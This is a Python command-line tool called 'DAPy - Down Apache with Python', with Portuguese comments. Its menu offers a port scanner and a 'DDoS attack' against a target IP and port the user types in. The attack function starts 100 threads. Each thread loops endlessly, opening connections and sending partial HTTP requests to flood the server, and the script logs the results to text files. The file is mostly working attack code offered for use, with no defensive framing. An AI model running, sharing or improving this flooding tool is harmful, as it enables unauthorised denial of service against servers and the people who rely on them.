import socket
import threading
import os
import sys
import time

# Função para exibir o banner
def show_banner():
    banner = """
    =========================================
              DAPy - Down Apache with Python
    =========================================
    """
    print(banner)

# Função para escaneamento de portas
def portscan(target_ip, start_port, end_port):
    print(f"\nIniciando escaneamento de portas em {target_ip}...\n")
    for port in range(start_port, end_port + 1):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                print(f"Porta {port} está aberta.")
            sock.close()
        except Exception as e:
            print(f"Erro ao escanear porta {port}: {str(e)}")

    print("\nEscaneamento concluído.\n")

# Função para ataque DDoS
def ddos_attack(target_ip, target_port):
    print(f"\nIniciando ataque DDoS em {target_ip}:{target_port}...\n")
    try:
        def attack():
            while True:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    sock.connect((target_ip, target_port))
                    sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
                    sock.sendto(b"Host: " + bytes(target_ip, 'utf-8') + b"\r\n\r\n", (target_ip, target_port))
                except socket.error as e:
                    with open("ddoserr.txt", "a") as error_file:
                        error_file.write(f"Erro durante o ataque DDoS: {str(e)}\n")
                finally:
                    sock.close()

        threads = []
        for i in range(100):  # Número de threads para o ataque
            thread = threading.Thread(target=attack)
            thread.start()
            threads.append(thread)
        
        # Espera todas as threads terminarem
        for thread in threads:
            thread.join()
        
        with open("ddos.txt", "w") as result_file:
            result_file.write(f"Ataque DDoS iniciado em {target_ip}:{target_port} com {len(threads)} threads.\n")

    except Exception as e:
        with open("ddoserr.txt", "a") as error_file:
            error_file.write(f"Erro ao iniciar o ataque DDoS: {str(e)}\n")

    print("\nAtaque DDoS iniciado. Resultados salvos em 'ddos.txt' e erros em 'ddoserr.txt'.\n")

# Função principal para escolher a operação
def main():
    while True:
        show_banner()
        print("Escolha uma função:")
        print("1. Escaneamento de Portas")
        print("2. Ataque DDoS")
        print("3. Sair")

        choice = input("\nDigite sua escolha: ")

        if choice == '1':
            target_ip = input("Digite o IP de destino: ")
            start_port = int(input("Digite a porta inicial: "))
            end_port = int(input("Digite a porta final: "))
            portscan(target_ip, start_port, end_port)
        elif choice == '2':
            target_ip = input("Digite o IP de destino: ")
            target_port = int(input("Digite a porta de destino: "))
            ddos_attack(target_ip, target_port)
        elif choice == '3':
            print("Saindo...")
            sys.exit()
        else:
            print("Escolha inválida! Tente novamente.")

        # Pergunta ao usuário se deseja alternar entre as funções
        switch = input("Deseja alternar entre as funções? (s/n): ")
        if switch.lower() != 's':
            break

if __name__ == "__main__":
    main()
